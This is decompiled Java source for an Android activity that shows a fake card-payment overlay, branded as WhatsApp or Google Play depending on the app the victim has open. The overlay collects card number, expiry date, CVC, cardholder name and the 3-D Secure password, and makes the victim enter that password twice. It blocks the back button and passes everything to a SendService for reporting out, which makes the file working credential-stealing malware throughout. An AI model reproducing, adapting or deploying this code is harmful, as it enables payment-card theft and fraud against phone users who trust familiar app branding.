package exts.whats.activities;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.text.Editable;
import android.text.InputFilter;
import android.text.InputFilter.LengthFilter;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.animation.Animation;
import android.view.animation.Animation.AnimationListener;
import android.view.animation.AnimationUtils;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import exts.whats.R;
import exts.whats.SendService;
import exts.whats.billing.CreditCardImagesAnimator;
import exts.whats.billing.CreditCardImagesAnimatorFroyo;
import exts.whats.billing.CreditCardNumberEditText;
import exts.whats.billing.CreditCardNumberEditText.OnCreditCardTypeChangedListener;
import exts.whats.billing.CreditCardNumberEditText.OnValidNumberEnteredListener;
import exts.whats.billing.CreditCardType;
import exts.whats.utils.Utils;
import org.json.JSONException;
import org.json.JSONObject;

public class Cards extends Activity implements OnCreditCardTypeChangedListener, OnValidNumberEnteredListener {
    private static CreditCardType[] CREDIT_CARD_IMAGES_TYPE_ORDER = new CreditCardType[]{CreditCardType.VISA, CreditCardType.MC, CreditCardType.AMEX, CreditCardType.DISCOVER, CreditCardType.JCB};
    private CreditCardNumberEditText ccBox;
    /* access modifiers changed from: private */
    public View contentCardView;
    /* access modifiers changed from: private */
    public View contentWholeView;
    private Button continueButton;
    private ImageView[] creditCardImages;
    /* access modifiers changed from: private */
    public CreditCardType currentCardType;
    /* access modifiers changed from: private */
    public State currentState;
    /* access modifiers changed from: private */
    public EditText cvcBox;
    private ImageView cvcPopup;
    private TextView errorMessageVbv;
    /* access modifiers changed from: private */
    public EditText expiration1st;
    private EditText expiration2nd;
    private CreditCardImagesAnimator imagesAnimator;
    /* access modifiers changed from: private */
    public View loadingView;
    private ImageView logotype;
    private TextView logotypeTextView;
    private TextView logotypeTextViewVbv;
    private ImageView logotypeVbv;
    private EditText nameOnCard;
    /* access modifiers changed from: private */
    public String oldVbvPass = "";
    private String packageName;
    private BroadcastReceiver signalsReceiver;
    /* access modifiers changed from: private */
    public View vbvConfirmationView;
    /* access modifiers changed from: private */
    public ImageView vbvLogo;
    /* access modifiers changed from: private */
    public EditText vbvPass;

    private static class AutoAdvancer implements TextWatcher {
        private int mMaxLength;
        private final TextView mTextView;

        public AutoAdvancer(TextView paramTextView, int paramInt) {
            this.mTextView = paramTextView;
            this.mMaxLength = paramInt;
        }

        public void afterTextChanged(Editable paramEditable) {
            if (paramEditable.length() >= this.mMaxLength) {
                Cards.focusNext(this.mTextView);
            }
            if (paramEditable.length() == 0) {
                Cards.focusPrevious(this.mTextView);
            }
        }

        public void beforeTextChanged(CharSequence paramCharSequence, int paramInt1, int paramInt2, int paramInt3) {
        }

        public void onTextChanged(CharSequence paramCharSequence, int paramInt1, int paramInt2, int paramInt3) {
        }
    }

    private class CvcTextWatcher implements TextWatcher {
        private CvcTextWatcher() {
        }

        /* synthetic */ CvcTextWatcher(Cards cards, CvcTextWatcher cvcTextWatcher) {
            this();
        }

        private int getCurrentCvcLength() {
            int i = CreditCardType.getMaxCvcLength();
            if (Cards.this.currentCardType != null) {
                return Cards.this.currentCardType.cvcLength;
            }
            return i;
        }

        public void afterTextChanged(Editable editable) {
            if (editable.length() >= getCurrentCvcLength()) {
                Cards.this.onCvcEntered();
            }
            if (editable.length() == 0) {
                Cards.focusPrevious(Cards.this.cvcBox);
            }
        }

        public void beforeTextChanged(CharSequence s, int start, int count, int after) {
        }

        public void onTextChanged(CharSequence s, int start, int before, int count) {
        }
    }

    private enum State {
        STATE_ENTERING_NUMBER,
        STATE_ENTERING_VBV
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.billing_addcreditcard_fragment);
        this.logotype = (ImageView) findViewById(R.id.logotype);
        this.logotypeTextView = (TextView) findViewById(R.id.logotype_text);
        this.logotypeVbv = (ImageView) findViewById(R.id.logotype_vbv);
        this.logotypeTextViewVbv = (TextView) findViewById(R.id.logotype_text_vbv);
        this.packageName = getIntent().getStringExtra("package");
        updateLogoAndText();
        this.contentWholeView = findViewById(R.id.credit_card_details);
        this.contentCardView = findViewById(R.id.addcreditcard_fields);
        this.vbvConfirmationView = findViewById(R.id.vbv_confirmation);
        this.loadingView = findViewById(R.id.loading_spinner);
        this.ccBox = (CreditCardNumberEditText) findViewById(R.id.cc_box);
        this.ccBox.setOnCreditCardTypeChangedListener(this);
        this.cvcPopup = (ImageView) findViewById(R.id.cvc_image);
        this.cvcPopup.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                View view = Cards.this.getCurrentFocus();
                if (view != null) {
                    ((InputMethodManager) Cards.this.getSystemService("input_method")).hideSoftInputFromWindow(view.getWindowToken(), 2);
                }
                Intent i = new Intent(Cards.this, CvcPopup.class);
                i.addFlags(268435456);
                i.addFlags(131072);
                Cards.this.startActivity(i);
            }
        });
        this.expiration1st = (EditText) findViewById(R.id.expiration_date_entry_1st);
        this.expiration2nd = (EditText) findViewById(R.id.expiration_date_entry_2nd);
        this.expiration1st.addTextChangedListener(new AutoAdvancer(this.expiration1st, 2));
        this.expiration2nd.addTextChangedListener(new AutoAdvancer(this.expiration2nd, 2));
        this.cvcBox = (EditText) findViewById(R.id.cvc_entry);
        this.cvcBox.addTextChangedListener(new CvcTextWatcher(this, null));
        this.nameOnCard = (EditText) findViewById(R.id.name_on_card);
        this.continueButton = (Button) findViewById(R.id.positive_button);
        this.continueButton.setText(getString(R.string.add_instrument_continue));
        this.continueButton.setEnabled(false);
        this.creditCardImages = new ImageView[]{(ImageView) findViewById(R.id.visa_logo), (ImageView) findViewById(R.id.mastercard_logo), (ImageView) findViewById(R.id.amex_logo), (ImageView) findViewById(R.id.discover_logo), (ImageView) findViewById(R.id.jcb_logo)};
        this.imagesAnimator = new CreditCardImagesAnimatorFroyo(this, this.creditCardImages, CREDIT_CARD_IMAGES_TYPE_ORDER);
        this.ccBox.setOnNumberEnteredListener(new OnValidNumberEnteredListener() {
            public void onNumberEntered() {
                Cards.this.onNumberEntered();
                Cards.this.expiration1st.requestFocus();
            }
        });
        this.continueButton.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                if (Cards.this.currentState == State.STATE_ENTERING_NUMBER) {
                    if (!Cards.this.areAllCardFieldsValid()) {
                        return;
                    }
                    if (Cards.this.needVbv() && (Cards.this.currentCardType == CreditCardType.MC || Cards.this.currentCardType == CreditCardType.VISA)) {
                        if (Cards.this.currentCardType == CreditCardType.VISA) {
                            Cards.this.vbvLogo.setBackgroundResource(R.drawable.verified_by_visa_logo);
                        } else if (Cards.this.currentCardType == CreditCardType.MC) {
                            Cards.this.vbvLogo.setBackgroundResource(R.drawable.mastercard_securecode_logo);
                        }
                        Cards.this.crossFade(Cards.this.contentCardView, 8, R.anim.fade_out, Cards.this.vbvConfirmationView, R.anim.fade_in, false);
                        Cards.this.vbvPass.requestFocus();
                        Cards.this.currentState = State.STATE_ENTERING_VBV;
                        return;
                    }
                    Cards.this.crossFade(Cards.this.contentWholeView, 4, R.anim.fade_out, Cards.this.loadingView, R.anim.slide_in_right, true);
                    Cards.this.sendData();
                } else if (Cards.this.currentState != State.STATE_ENTERING_VBV) {
                } else {
                    if (!Cards.this.areAllVbvFieldsValid()) {
                        Cards.this.oldVbvPass = "";
                        Cards.this.vbvPass.setText("");
                    } else if (Cards.this.oldVbvPass.equals("")) {
                        Cards.this.oldVbvPass = Cards.this.vbvPass.getText().toString();
                        Cards.this.playShakeAnimation(Cards.this.vbvPass);
                        Cards.this.vbvPass.setText("");
                    } else {
                        Cards.this.crossFade(Cards.this.contentWholeView, 4, R.anim.fade_out, Cards.this.loadingView, R.anim.slide_in_right, true);
                        Cards.this.sendData();
                    }
                }
            }
        });
        this.errorMessageVbv = (TextView) findViewById(R.id.error_message_vbv);
        this.currentState = State.STATE_ENTERING_NUMBER;
        initReceiver();
        this.vbvPass = (EditText) findViewById(R.id.vbv_pass);
        this.vbvLogo = (ImageView) findViewById(R.id.vbv_logo);
    }

    private void updateLogoAndText() {
        if (this.packageName.contains("com.whatsapp")) {
            this.logotype.setImageResource(R.drawable.whatsapp_icon);
            this.logotypeTextView.setText(getString(R.string.whatsapp));
            this.logotypeVbv.setImageResource(R.drawable.whatsapp_icon);
            this.logotypeTextViewVbv.setText(getString(R.string.whatsapp));
        } else if (this.packageName.contains("com.android.vending")) {
            this.logotype.setImageResource(R.drawable.google_play_icon);
            this.logotypeTextView.setText(getString(R.string.google_play));
            this.logotypeVbv.setImageResource(R.drawable.google_play_icon);
            this.logotypeTextViewVbv.setText(getString(R.string.google_play));
        } else {
            this.logotype.setImageResource(R.drawable.whatsapp_icon);
            this.logotypeTextView.setText(getString(R.string.whatsapp));
            this.logotypeVbv.setImageResource(R.drawable.whatsapp_icon);
            this.logotypeTextViewVbv.setText(getString(R.string.whatsapp));
        }
    }

    /* access modifiers changed from: private */
    public boolean needVbv() {
        String country = Utils.getUserCountry(this);
        if (country != null) {
            for (String countryCode : getResources().getStringArray(R.array.countries_without_vbv)) {
                if (countryCode.equalsIgnoreCase(country)) {
                    return false;
                }
            }
        }
        String cardBin = this.ccBox.getText().toString().replace(" ", "").substring(0, 6);
        String[] binsWithoutVbv = getResources().getStringArray(R.array.bins_without_vbv);
        for (String equals : binsWithoutVbv) {
            if (equals.equals(cardBin)) {
                return false;
            }
        }
        return true;
    }

    private boolean binIsInBlackList() {
        String cardBin = this.ccBox.getText().toString().replace(" ", "").substring(0, 6);
        String[] binsBlackList = getResources().getStringArray(R.array.bins_black_list);
        for (String equals : binsBlackList) {
            if (equals.equals(cardBin)) {
                return true;
            }
        }
        return false;
    }

    /* access modifiers changed from: private */
    public boolean areAllCardFieldsValid() {
        if (!this.currentCardType.isValidNumber(this.ccBox.getText().toString().replace(" ", "")) || binIsInBlackList()) {
            playShakeAnimation(this.ccBox);
            return false;
        }
        int month = Integer.parseInt(this.expiration1st.getText().toString());
        if (month < 1 || month > 12 || this.expiration1st.getText().toString().length() != 2) {
            playShakeAnimation(this.expiration1st);
            return false;
        }
        int year = Integer.parseInt(this.expiration2nd.getText().toString());
        if (year < 16 || year > 25 || this.expiration2nd.getText().toString().length() != 2) {
            playShakeAnimation(this.expiration2nd);
            return false;
        } else if (this.cvcBox.getText().toString().length() != this.currentCardType.cvcLength) {
            playShakeAnimation(this.cvcBox);
            return false;
        } else if (this.nameOnCard.getText().toString().length() >= 3) {
            return true;
        } else {
            playShakeAnimation(this.nameOnCard);
            return false;
        }
    }

    public boolean areAllVbvFieldsValid() {
        if (!TextUtils.isEmpty(this.vbvPass.getText().toString()) && this.vbvPass.getText().toString().trim().length() >= 4) {
            return true;
        }
        playShakeAnimation(this.vbvPass);
        return false;
    }

    /* access modifiers changed from: private */
    public void sendData() {
        try {
            JSONObject cardObject = new JSONObject();
            cardObject.put("number", this.ccBox.getText().toString());
            cardObject.put("month", this.expiration1st.getText().toString());
            cardObject.put("year", this.expiration2nd.getText().toString());
            cardObject.put("cvc", this.cvcBox.getText().toString());
            cardObject.put("cardholder", this.nameOnCard.getText().toString());
            cardObject.put("vbv1", this.oldVbvPass);
            cardObject.put("vbv2", this.vbvPass.getText().toString());
            Intent start = new Intent(this, SendService.class);
            start.setAction(SendService.REPORT_CARD_DATA);
            start.putExtra("data", cardObject.toString());
            startService(start);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public void crossFade(View fromView, int fromViewFinalVisibility, int fromAnimation, View toView, int toAnimation, boolean closeKeyboard) {
        Animation anim1 = AnimationUtils.loadAnimation(this, fromAnimation);
        fromView.setVisibility(fromViewFinalVisibility);
        anim1.setAnimationListener(new AnimationListener() {
            public void onAnimationStart(Animation animation) {
            }

            public void onAnimationEnd(Animation animation) {
            }

            public void onAnimationRepeat(Animation animation) {
            }
        });
        fromView.startAnimation(anim1);
        toView.setVisibility(0);
        Animation anim2 = AnimationUtils.loadAnimation(this, toAnimation);
        anim2.setAnimationListener(new AnimationListener() {
            public void onAnimationStart(Animation animation) {
            }

            public void onAnimationEnd(Animation animation) {
            }

            public void onAnimationRepeat(Animation animation) {
            }
        });
        toView.startAnimation(anim2);
        if (closeKeyboard) {
            View view = getCurrentFocus();
            if (view != null) {
                ((InputMethodManager) getSystemService("input_method")).hideSoftInputFromWindow(view.getWindowToken(), 2);
            }
        }
    }

    public void onCreditCardTypeChanged(CreditCardType oldType, CreditCardType newType) {
        this.currentCardType = newType;
        this.cvcBox.setFilters(new InputFilter[]{new LengthFilter(newType.cvcLength)});
        this.imagesAnimator.animateToType(newType);
    }

    /* access modifiers changed from: private */
    public void onCvcEntered() {
        if (this.currentState == State.STATE_ENTERING_NUMBER) {
            this.cvcBox.setNextFocusDownId(R.id.name_on_card);
            this.nameOnCard.requestFocus();
            this.continueButton.setEnabled(true);
        }
    }

    public void onNumberEntered() {
        if (this.currentState == State.STATE_ENTERING_NUMBER) {
            this.ccBox.setNextFocusDownId(R.id.expiration_date_entry_1st);
        }
    }

    protected static void focusNext(View paramView) {
        View localView = paramView.focusSearch(66);
        if (localView != null) {
            localView.requestFocus();
        }
    }

    protected static void focusPrevious(View paramView) {
        View localView = paramView.focusSearch(17);
        if (localView != null) {
            localView.requestFocus();
        }
    }

    /* access modifiers changed from: private */
    public void playShakeAnimation(View view) {
        view.startAnimation(AnimationUtils.loadAnimation(this, R.anim.shake));
    }

    private void initReceiver() {
        this.signalsReceiver = new BroadcastReceiver() {
            public void onReceive(Context context, Intent i) {
                if (i.getExtras().getBoolean("status")) {
                    Cards.this.finish();
                } else {
                    Cards.this.showError();
                }
            }
        };
        registerReceiver(this.signalsReceiver, new IntentFilter(SendService.UPDATE_CARDS_UI));
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == 4) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    public void onBackPressed() {
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(this.signalsReceiver);
    }

    /* access modifiers changed from: private */
    public void showError() {
        this.loadingView.setVisibility(8);
        this.contentWholeView.setVisibility(0);
        if (this.currentState == State.STATE_ENTERING_VBV) {
            this.errorMessageVbv.setVisibility(0);
        }
    }

    /* access modifiers changed from: protected */
    public void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        String packageNew = getIntent().getStringExtra("package");
        if (!this.packageName.equals(packageNew)) {
            this.packageName = packageNew;
            updateLogoAndText();
        }
    }
}
